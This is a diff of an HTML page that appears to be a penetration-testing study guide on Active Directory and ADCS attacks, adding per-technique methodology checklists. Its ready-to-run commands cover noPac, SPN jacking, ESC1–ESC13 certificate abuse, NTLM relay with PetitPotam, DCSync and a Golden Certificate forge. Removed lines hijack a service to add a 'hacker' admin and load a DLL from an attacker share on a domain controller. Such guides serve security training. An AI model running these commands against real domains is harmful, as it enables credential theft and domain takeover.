+<li><input type="checkbox" data-id="cape-dacl2-dcom-lateral-wf-1"> Pick the DCOM object the target still exposes: <code>MMC20.Application</code>, <code>ShellWindows</code>, or <code>ShellBrowserWindow</code>.</li>
+<li><input type="checkbox" data-id="cape-dacl2-dcom-lateral-wf-2"> Instantiate via <code>GetTypeFromProgID</code> and call <code>ExecuteShellCommand</code> or <code>ShellExecute</code> from PowerShell.</li>
+</ul>
 
 <h3 id="cape-dacl2-noPac">8.11 sAMAccountName Spoofing (noPac / CVE-2021-42278)</h3>
 <p>noPac chains two CVEs against unpatched DCs. CVE-2021-42278 lets an authenticated user rename a computer account whose <code>sAMAccountName</code> ends in <code>$</code>. CVE-2021-42287 lets a service ticket obtained under one name still be honoured after a rename, if the KDC cannot find the account and falls back to a <code>$</code>-appended lookup. Combined, the chain lets any authenticated user impersonate a Domain Controller.</p>
@@ -2052,6 +2152,12 @@ renamemachine.py -current-name DC01 -new-name FAKE01 -dc-ip &lt;dc-ip&gt; &lt;do
 # 5. S4U for administrator using the TGT
 getST.py -self -impersonate administrator -spn "cifs/&lt;dc-fqdn&gt;" -dc-ip &lt;dc-ip&gt; &lt;domain.local&gt;/DC01</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-dacl2-nopac-wf-0"> Verify the DC is unpatched against CVE-2021-42278 / CVE-2021-42287.</li>
+<li><input type="checkbox" data-id="cape-dacl2-nopac-wf-1"> Run <code>noPac.py -impersonate administrator -use-ldap</code> as any authenticated user.</li>
+</ul>
+
 <h3 id="cape-dacl2-spn-jacking">8.12 SPN Jacking</h3>
 <p>SPN Jacking abuses <code>WriteSPN</code> or full write access on a service account to temporarily hijack the SPN of a machine or another service. Once the SPN is on the attacker-controlled account, any Kerberos service ticket issued for that SPN is encrypted with the attacker's key rather than the legitimate account's. This lets the attacker capture and decrypt tickets meant for another service, or plant a targeted Kerberoast attack.</p>
 <pre><code class="language-powershell"># Move an SPN onto a controlled account
@@ -2063,6 +2169,12 @@ Rubeus.exe asktgs /service:cifs/&lt;victim-fqdn&gt; /ticket:&lt;user-tgt&gt; /pt
 # Clean the SPN off the controlled account
 Set-DomainObject -Identity &lt;attacker-account&gt; -Clear serviceprincipalname</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-dacl2-spn-jacking-wf-0"> Confirm <code>WriteSPN</code> or full write access on a controlled service account.</li>
+<li><input type="checkbox" data-id="cape-dacl2-spn-jacking-wf-1"> Move the victim SPN onto the controlled account with <code>Set-DomainObject</code>, request the ticket, then clear the SPN back.</li>
+</ul>
+
 <h3 id="cape-dacl2-logon-scripts">8.13 Logon Script Attacks</h3>
 <p>The <code>scriptPath</code> attribute on a user object names a script that runs at every interactive logon, resolved against the domain's NETLOGON share. Write access to <code>scriptPath</code> (via <code>GenericWrite</code>) turns any user into a callback-on-logon primitive. A related path abuses GPO logon scripts staged under <code>SYSVOL\&lt;domain&gt;\scripts</code>, which apply through the linked GPO.</p>
 <pre><code class="language-powershell"># User-attribute variant: needs GenericWrite on the target user
@@ -2072,38 +2184,12 @@ Set-DomainObject -Identity &lt;target-user&gt; -Set @{scriptPath='\\&lt;attacker
 # Copy the payload into the GPO's Scripts\Logon folder
 copy payload.bat "\\&lt;dc-fqdn&gt;\SYSVOL\&lt;domain&gt;\Policies\{&lt;gpo-guid&gt;}\User\Scripts\Logon\"</code></pre>
 
-<h3 id="cape-dacl2-methodology">8.14 Methodology</h3>
+<h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-dacl2-methodology-wf-0"> Enumerate historically-privileged groups (Server Operators, DNS Admins, Backup Operators, Account Operators).
-<pre><code class="language-powershell">Get-ADGroupMember "Server Operators"
-Get-ADGroupMember "DnsAdmins"
-Get-ADGroupMember "Backup Operators"
-Get-ADGroupMember "Account Operators"</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-dacl2-methodology-wf-1"> Look for accounts with SeBackupPrivilege, SeRestorePrivilege, SeManageVolumePrivilege, SeDebugPrivilege.
-<pre><code class="language-bash">whoami /priv</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-dacl2-methodology-wf-2"> DCSync anywhere you have replication rights.
-<pre><code class="language-bash">secretsdump.py domain.local/user:pass@&lt;dc&gt; -just-dc-ntlm</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-dacl2-methodology-wf-3"> For SeBackupPrivilege, diskshadow → ntds.dit → secretsdump.
-<pre><code class="language-bash">diskshadow.exe -s C:\temp\script.txt
-Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\temp\ntds.dit -Overwrite
-secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-dacl2-methodology-wf-4"> MS14-068 for unpatched DCs.
-<pre><code class="language-bash">python goldenPac.py domain.local/user:pass@&lt;dc&gt;</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-dacl2-methodology-wf-5"> Server Operators, hijack a SYSTEM service.
-<pre><code class="language-bash">sc.exe config &lt;svc&gt; binPath= "cmd.exe /c net user hacker <password> /add &amp;&amp; net localgroup administrators hacker /add"
-sc.exe start &lt;svc&gt;</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-dacl2-methodology-wf-6"> DNS Admins, load a malicious plugin DLL as SYSTEM on the DC.
-<pre><code class="language-bash">dnscmd &lt;dc&gt; /config /serverlevelplugindll \\attacker\share\adduser.dll
-sc.exe \\&lt;dc&gt; stop dns &amp;&amp; sc.exe \\&lt;dc&gt; start dns</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-dacl2-methodology-wf-7"> Test each abuse in a non-production environment first, DNS plugin registration can crash the service if the DLL is malformed.</li>
+<li><input type="checkbox" data-id="cape-dacl2-logon-wf-0"> User variant: hold <code>GenericWrite</code> on the target user and set <code>scriptPath</code> to a UNC on your share.</li>
+<li><input type="checkbox" data-id="cape-dacl2-logon-wf-1"> GPO variant: hold write on the GPO's SYSVOL directory and drop a payload under <code>Scripts\Logon</code>.</li>
 </ul>
+
 <h2 id="cape-adcs-9">9. ADCS Attacks</h2>
 <p>Active Directory Certificate Services (ADCS) is the CA that domains use to issue X.509 certificates for authentication, encryption, and signing. Its templates control who can enrol, for what purpose, and with which subject. When those templates drift, ADCS turns into one of the fastest paths to Domain Admin on Windows, catalogued as ESC1 through ESC15+ by the SpecterOps <em>Certified Pre-Owned</em> research. In practice, most environments running ADCS have at least one exploitable template, and Certipy will find it in under a minute.</p>
 <p style="text-align:center;"><img src="./img/cape/adcs-esc1-template.png" alt="ADCS ESC1 vulnerable certificate template configuration" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
@@ -2137,6 +2223,14 @@ sc.exe \\&lt;dc&gt; stop dns &amp;&amp; sc.exe \\&lt;dc&gt; start dns</code></pr
 </table>
 
 <h3 id="cape-adcs-exploitation">9.3 Exploitation</h3>
+<p>Enumeration is the same across every ESC. Certipy flags vulnerable templates, CA misconfigurations, and PKI-object DACLs in a single sweep:</p>
+<pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc&gt; -vulnerable -stdout</code></pre>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-adcs-enum-wf-0"> Enumerate every template and its permissions with <code>certipy find</code>.</li>
+<li><input type="checkbox" data-id="cape-adcs-enum-wf-1"> Filter for templates flagged ESC1 through ESC15 in Certipy's analysis output.</li>
+<li><input type="checkbox" data-id="cape-adcs-enum-wf-2"> Note any CA-level flags (<code>EDITF_ATTRIBUTESUBJECTALTNAME2</code>) and writable PKI-object DACLs Certipy surfaces alongside the template list.</li>
+</ul>
 
 <h4 id="cape-adcs-certutil">9.2.1 certutil.exe from the Target</h4>
 <p><code>certutil.exe</code> ships with Windows and lets an operator interact with ADCS from a beacon without dropping tooling. Most useful invocations for enumeration:</p>
@@ -2176,11 +2270,22 @@ openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.pem</code></pre>
 <p>Combined, a low-priv user can request a cert for Administrator. Certipy automates end-to-end:</p>
 <pre><code class="language-bash">certipy find -u user@domain.local -p <password> -dc-ip <dc-ip>
 certipy req -u user@domain.local -p <password> -target dc.domain.local -template VulnTemplate -upn administrator@domain.local -ca 'domain-DC-CA'</code></pre>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-adcs-esc1-wf-0"> Confirm the template has <code>ENROLLEE_SUPPLIES_SUBJECT</code>, Client Auth or Smart Card Logon EKU, and low-priv enrolment.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc1-wf-1"> Request a certificate with <code>-upn administrator@&lt;domain&gt;</code> using <code>certipy req</code>.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc1-wf-2"> Authenticate with the certificate to obtain a TGT and the target's NTLM hash.</li>
+</ul>
 
 <h4 id="cape-adcs-esc2">9.3.5 ESC2, Any Purpose EKU</h4>
 <p>ESC2 templates have <strong>Any Purpose</strong> (OID <code>2.5.29.37.0</code>) in their EKU list, or no EKU at all. Any Purpose implicitly allows Client Authentication, so a certificate issued under an ESC2 template can be used to authenticate to the domain even if the template was intended for something else. Enrollment rights are usually open to Domain Users, which turns this into an ESC1-style abuse without needing ENROLLEE_SUPPLIES_SUBJECT.</p>
 <pre><code class="language-bash"># Enrol against an ESC2 template: subject is fixed by the CA, but the cert works for PKINIT anyway
 certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template &lt;esc2-template&gt; -ca '&lt;ca-name&gt;'</code></pre>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-adcs-esc2-wf-0"> Confirm the template's EKU list contains <code>Any Purpose</code> (OID <code>2.5.29.37.0</code>) or is empty.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc2-wf-1"> Enrol as your current user; the CA fixes the subject but the certificate authenticates via PKINIT anyway.</li>
+</ul>
 
 <h4 id="cape-adcs-esc3">9.3.6 ESC3, Certificate Request Agent</h4>
 <p>ESC3 relies on the <strong>Certificate Request Agent</strong> EKU. A template with that EKU lets an enrollee request certificates on behalf of other users. The chain is a two-step enrolment: first, enrol for the Certificate Request Agent template; second, use that agent cert to request a Client Authentication cert for a Domain Admin.</p>
@@ -2189,6 +2294,11 @@ certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &
 
 # Step 2: request a cert on behalf of a Domain Admin using the agent cert
 certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template 'User' -on-behalf-of '&lt;domain&gt;\administrator' -pfx agent.pfx -ca '&lt;ca-name&gt;'</code></pre>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-adcs-esc3-wf-0"> Locate a template carrying the <code>Certificate Request Agent</code> EKU that Domain Users can enrol in.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc3-wf-1"> Enrol for the agent template, then submit an <code>-on-behalf-of</code> request for a Domain Admin against a Client Auth template.</li>
+</ul>
 
 <h4 id="cape-adcs-esc4">9.3.7 ESC4, Vulnerable Template DACL</h4>
 <p>ESC4 is a permissions problem rather than a template-flags problem. If a low-privileged principal has write access on a certificate template object (<code>WriteDacl</code>, <code>WriteOwner</code>, <code>GenericAll</code>, <code>GenericWrite</code>), the template can be rewritten into an ESC1-shaped configuration and then abused normally.</p>
@@ -2200,11 +2310,21 @@ certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &
 
 # Restore the original template when finished
 certipy template -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -template &lt;template-name&gt; -configuration &lt;saved-config&gt;</code></pre>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-adcs-esc4-wf-0"> Confirm write access on the template object (<code>WriteDacl</code>, <code>WriteOwner</code>, <code>GenericAll</code>, or <code>GenericWrite</code>).</li>
+<li><input type="checkbox" data-id="cape-adcs-esc4-wf-1"> Save the original template configuration, rewrite into an ESC1 shape, request a cert as an admin, then restore.</li>
+</ul>
 
 <h4 id="cape-adcs-esc5">9.3.8 ESC5, Vulnerable PKI Object DACL</h4>
 <p>ESC5 covers writable DACLs on the PKI-related objects around the CA itself: the CA object in the Configuration container, the Enrollment Services container, the NTAuthCertificates object, and similar. Compromising any of these grants persistent control over the certificate services in the domain, up to and including full CA takeover.</p>
 <pre><code class="language-bash"># Certipy find surfaces vulnerable PKI-object DACLs alongside template ESCs
 certipy find -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -dc-ip &lt;dc-ip&gt; -vulnerable -stdout</code></pre>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-adcs-esc5-wf-0"> Identify writable DACLs on the CA object, Enrollment Services container, or the NTAuthCertificates object.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc5-wf-1"> Rewrite the DACL to grant yourself <code>ManageCA</code> or template-write, then pivot into ESC4 or ESC7 for the actual escalation.</li>
+</ul>
 
 <h4 id="cape-adcs-esc6">9.3.9 ESC6, EDITF_ATTRIBUTESUBJECTALTNAME2</h4>
 <p>The <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag on the CA lets any enrolment request specify an arbitrary Subject Alternative Name, regardless of the template. Any template that issues a Client Authentication cert becomes an ESC1 when this flag is set. It is disabled by default on modern CAs but still turns up on older environments.</p>
@@ -2213,6 +2333,11 @@ certipy find -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -dc-ip &
 
 # Request a cert for any user under any Client Auth template
 certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template 'User' -upn administrator@&lt;domain.local&gt; -ca '&lt;ca-name&gt;'</code></pre>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-adcs-esc6-wf-0"> Confirm <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> is set on the CA (Certipy reports it in the CA info block).</li>
+<li><input type="checkbox" data-id="cape-adcs-esc6-wf-1"> Enrol against any Client Authentication template with <code>-upn administrator@&lt;domain&gt;</code>.</li>
+</ul>
 
 <h4 id="cape-adcs-esc7">9.3.10 ESC7, Vulnerable CA Access Control</h4>
 <p>ESC7 is a writable DACL on the CA itself (<code>ManageCA</code> or <code>ManageCertificates</code> rights). <code>ManageCA</code> allows setting the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag on the CA policy or adding officers; <code>ManageCertificates</code> allows approving pending requests. Chained together, a foothold with <code>ManageCA</code> becomes ESC6 without needing the CA to have started that way.</p>
@@ -2225,6 +2350,11 @@ certipy ca -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -ca '&lt;c
 # Submit a request under any Client Auth template and approve it (needs ManageCertificates)
 certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template 'SubCA' -upn administrator@&lt;domain.local&gt; -ca '&lt;ca-name&gt;'
 certipy ca -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -ca '&lt;ca-name&gt;' -issue-request &lt;request-id&gt;</code></pre>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-adcs-esc7-wf-0"> Verify you hold <code>ManageCA</code> and/or <code>ManageCertificates</code> on the CA object.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc7-wf-1"> Grant yourself CA officer rights, then either flip the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag to pivot into ESC6, or submit-and-approve a request under a Client Auth template.</li>
+</ul>
 
 <h4 id="cape-adcs-esc8">9.3.11 ESC8, Web Enrollment NTLM Relay</h4>
 <p>ADCS Web Enrollment (the <code>/certsrv/</code> HTTP endpoint) accepts NTLM authentication by default and does not enforce channel binding or HTTPS in many deployments. An attacker coerces a machine account (or a Domain Controller) to authenticate via a primitive like PetitPotam or DFSCoerce, relays that NTLM to <code>/certsrv/</code>, and receives a certificate for the coerced identity.</p>
@@ -2240,6 +2370,12 @@ python3 printerbug.py &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;'@&lt;target-
 
 # 4. Authenticate with the relayed certificate to get the DC's TGT and NTLM hash
 certipy auth -pfx &lt;dc&gt;.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-adcs-esc8-wf-0"> Confirm <code>/certsrv/</code> Web Enrollment is reachable and accepts NTLM without EPA / channel binding.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc8-wf-1"> Start <code>ntlmrelayx --adcs --template DomainController</code> against the Web Enrollment endpoint.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc8-wf-2"> Coerce the target with PetitPotam, DFSCoerce, or PrinterBug and authenticate with the relayed certificate.</li>
+</ul>
 
 <h4 id="cape-adcs-esc9">9.3.12 ESC9, No Security Extension</h4>
 <p>ESC9 templates have the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag set, which suppresses the <code>szOID_NTDS_CA_SECURITY_EXT</code> extension in issued certificates. That extension is what a KDC uses to bind a certificate to a specific SID during PKINIT. Without it, weak certificate mappings on the DC (see ESC10) can be used to authenticate as a different account by changing the target's <code>userPrincipalName</code>.</p>
@@ -2255,6 +2391,11 @@ certipy account -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -user
 
 # 4. Authenticate: the DC maps by UPN because there is no security extension
 certipy auth -pfx &lt;sacrificial-user&gt;.pfx -domain &lt;domain.local&gt; -username administrator</code></pre>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-adcs-esc9-wf-0"> Confirm the template has <code>CT_FLAG_NO_SECURITY_EXTENSION</code> and you hold <code>GenericWrite</code> over a sacrificial account.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc9-wf-1"> Swap the sacrificial account's UPN to the target, enrol, revert the UPN, then authenticate.</li>
+</ul>
 
 <h4 id="cape-adcs-esc10">9.3.13 ESC10, Weak Certificate Mappings</h4>
 <p>ESC10 targets weak certificate mapping configurations on the domain controller itself. The registry values <code>CertificateMappingMethods</code> and <code>StrongCertificateBindingEnforcement</code> control how strictly the DC enforces the binding between a certificate and an account. When strict enforcement is off, a certificate with an alternate identity in its Subject or SAN can authenticate as an account other than the one it was issued to.</p>
@@ -2264,6 +2405,11 @@ certipy account -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -user
 certipy req -u &lt;sacrificial-user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template User -ca '&lt;ca-name&gt;'
 certipy account -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -user &lt;sacrificial-user&gt; -upn &lt;sacrificial-user&gt;@&lt;domain.local&gt; update
 certipy auth -pfx &lt;sacrificial-user&gt;.pfx -domain &lt;domain.local&gt; -username administrator</code></pre>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-adcs-esc10-wf-0"> Read the DC's <code>CertificateMappingMethods</code> and <code>StrongCertificateBindingEnforcement</code> registry values.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc10-wf-1"> With weak enforcement, use the same UPN-swap flow as ESC9 against any Client Auth template.</li>
+</ul>
 
 <h4 id="cape-adcs-esc11">9.3.14 ESC11, Relay to ICPR</h4>
 <p>ESC11 extends the ESC8 idea from HTTP Web Enrollment to the ICertPassage Remote Protocol (RPC) endpoint. When the CA's ICPR interface does not enforce packet-level integrity (<code>IF_ENFORCEENCRYPTICERTREQUEST</code> off), NTLM auth can be relayed to it and used to enrol certificates for the coerced identity.</p>
@@ -2272,12 +2418,22 @@ ntlmrelayx.py -t rpc://&lt;ca-fqdn&gt; -rpc-mode ICPR -icpr-ca-name '&lt;ca-name
 
 # Coerce as in ESC8
 python3 PetitPotam.py -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domain&gt; &lt;attacker-ip&gt; &lt;target-dc&gt;</code></pre>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-adcs-esc11-wf-0"> Confirm ICPR does not enforce <code>IF_ENFORCEENCRYPTICERTREQUEST</code>.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc11-wf-1"> Start <code>ntlmrelayx -t rpc://&lt;ca&gt; -rpc-mode ICPR</code> and trigger any coercion primitive.</li>
+</ul>
 
 <h4 id="cape-adcs-esc13">9.3.15 ESC13, OID Group Link</h4>
 <p>ESC13 exploits an Application Policy OID linked to a Universal Security Group. When a template's Application Policy OID resolves to a group, any principal authenticating with a certificate issued under that template is treated as a member of that group for the lifetime of the token. Compromise of enrolment rights on the linked template becomes group membership, without touching the group's actual members.</p>
 <pre><code class="language-bash"># Enrol for the ESC13 template: the resulting cert grants effective group membership
 certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template &lt;esc13-template&gt; -ca '&lt;ca-name&gt;'
 certipy auth -pfx &lt;user&gt;.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-adcs-esc13-wf-0"> Identify a template whose Application Policy OID resolves to a Universal Security Group Certipy flags as ESC13.</li>
+<li><input type="checkbox" data-id="cape-adcs-esc13-wf-1"> Enrol against the template; the issued certificate grants effective membership in the linked group at authentication time.</li>
+</ul>
 
 <h4 id="cape-adcs-shadow-creds">9.3.16 Shadow Credentials</h4>
 <p>Shadow Credentials is a persistence and lateral movement primitive that uses the <code>msDS-KeyCredentialLink</code> attribute (the Key Trust attribute for Windows Hello for Business). An attacker with write access to the attribute on a target account can add their own certificate-based credential, then authenticate as that account via PKINIT. The rest of the account's authentication (password, tokens) remains untouched.</p>
@@ -2289,6 +2445,11 @@ certipy shadow -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -accou
 # Read/write/list/clear/info sub-actions are also available
 certipy shadow -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -account '&lt;target&gt;' list
 certipy shadow -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -account '&lt;target&gt;' clear</code></pre>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-adcs-shadow-wf-0"> Confirm write access on the target's <code>msDS-KeyCredentialLink</code> (<code>GenericWrite</code> is enough).</li>
+<li><input type="checkbox" data-id="cape-adcs-shadow-wf-1"> Run <code>certipy shadow auto</code> to add a key credential and receive the TGT and NTLM hash in one step.</li>
+</ul>
 
 <h4 id="cape-adcs-golden-cert">9.3.17 Golden Certificate</h4>
 <p>A Golden Certificate is the ADCS analogue of the Golden Ticket. If the CA's private key is compromised, an attacker can forge certificates for any principal in the forest without touching the CA infrastructure. As long as the CA remains trusted (and its private key is not rotated), the forged certificates keep working, which turns this into permanent forest persistence.</p>
@@ -2300,70 +2461,36 @@ certipy forge -ca-pfx ca.pfx -upn administrator@&lt;domain.local&gt; -subject 'C
 
 # 3. Authenticate with the forged cert
 certipy auth -pfx administrator_forged.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-adcs-golden-wf-0"> Extract the CA private key from a compromised CA server with <code>certipy ca -backup</code>.</li>
+<li><input type="checkbox" data-id="cape-adcs-golden-wf-1"> Forge a certificate for any principal with <code>certipy forge</code> and authenticate to obtain a TGT.</li>
+</ul>
 
 <h4 id="cape-adcs-certipy-auth">9.3.18 Authenticating with the Certificate</h4>
 <p>Use the certificate to obtain a TGT and the target's NTLM hash. Certipy walks the PKINIT exchange for you and returns both in one command.</p>
 <p style="text-align:center;"><img src="./img/cape/pkinit-certificate-auth.png" alt="PKINIT certificate authentication exchange between client, KDC, and target" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <pre><code class="language-bash">certipy auth -pfx administrator.pfx -dc-ip <dc-ip></code></pre>
 <p>Sample output, TGT saved as .ccache, plus the NTLM hash of the impersonated user, which becomes reusable material for PtH and DCSync.</p>
-
-<h3 id="cape-adcs-methodology">9.4 Methodology</h3>
+<h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-methodology-wf-0"> Enumerate every template and its permissions.
-<pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc&gt; -vulnerable -stdout</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-adcs-methodology-wf-1"> Filter for templates flagged ESC1–ESC15 by Certipy's analysis.</li>
-<li><input type="checkbox" data-id="cape-adcs-methodology-wf-2"> Prefer ESC1 first, the simplest and most common.
-<pre><code class="language-bash">certipy req -u user@domain.local -p pass -target dc.domain.local -template VulnTemplate -upn administrator@domain.local -ca 'domain-DC-CA'</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-adcs-methodology-wf-3"> For ESC2, enrol against any Any-Purpose (or empty-EKU) template. The subject is fixed by the CA but the cert still authenticates via PKINIT.
-<pre><code class="language-bash">certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template &lt;esc2-template&gt; -ca '&lt;ca-name&gt;'</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-adcs-methodology-wf-4"> For ESC3, enrol in the Certificate Request Agent template, then request on behalf of another user.
-<pre><code class="language-bash">certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template 'CertRequestAgent' -ca '&lt;ca-name&gt;'
-certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template 'User' -on-behalf-of '&lt;domain&gt;\administrator' -pfx agent.pfx -ca '&lt;ca-name&gt;'</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-adcs-methodology-wf-4a"> For ESC4, rewrite the target template into an ESC1 shape, abuse, then restore.
-<pre><code class="language-bash">certipy template -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -template &lt;template-name&gt; -save-old
-certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template &lt;template-name&gt; -upn administrator@&lt;domain.local&gt; -ca '&lt;ca-name&gt;'</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-adcs-methodology-wf-4b"> For ESC6 (or ESC7 chained into ESC6), request any Client Authentication template with a chosen UPN.
-<pre><code class="language-bash">certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template 'User' -upn administrator@&lt;domain.local&gt; -ca '&lt;ca-name&gt;'</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-adcs-methodology-wf-4c"> For ESC7, grant yourself CA officer rights, flip the EDITF flag, submit-and-issue.
-<pre><code class="language-bash">certipy ca -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -ca '&lt;ca-name&gt;' -add-officer &lt;user&gt;
-certipy ca -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -ca '&lt;ca-name&gt;' -enable-flag EDITF_ATTRIBUTESUBJECTALTNAME2</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-adcs-methodology-wf-4d"> For ESC8, relay a coerced machine account to ADCS Web Enrolment.
-<pre><code class="language-bash">ntlmrelayx.py -t http://&lt;ca-fqdn&gt;/certsrv/certfnsh.asp --adcs --template DomainController
-python3 PetitPotam.py -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domain&gt; &lt;attacker-ip&gt; &lt;target-dc&gt;</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-adcs-methodology-wf-4e"> For ESC9 / ESC10, use a sacrificial account with UPN swap to abuse weak certificate mappings.
-<pre><code class="language-bash">certipy account -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -user &lt;sacrificial-user&gt; -upn administrator update
-certipy req -u &lt;sacrificial-user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template &lt;template&gt; -ca '&lt;ca-name&gt;'
-certipy auth -pfx &lt;sacrificial-user&gt;.pfx -domain &lt;domain.local&gt; -username administrator</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-adcs-methodology-wf-4f"> For ESC11, relay a coerced account to the ICPR RPC endpoint.
-<pre><code class="language-bash">ntlmrelayx.py -t rpc://&lt;ca-fqdn&gt; -rpc-mode ICPR -icpr-ca-name '&lt;ca-name&gt;' --adcs --template DomainController</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-adcs-methodology-wf-4g"> Shadow Credentials, GenericWrite over the target is enough to add a certificate-based credential and PKINIT as that account.
-<pre><code class="language-bash">certipy shadow -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -account '&lt;target&gt;' auto</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-adcs-methodology-wf-5"> Authenticate with the certificate to get a TGT and NTLM hash.
-<pre><code class="language-bash">certipy auth -pfx administrator.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
-</li>
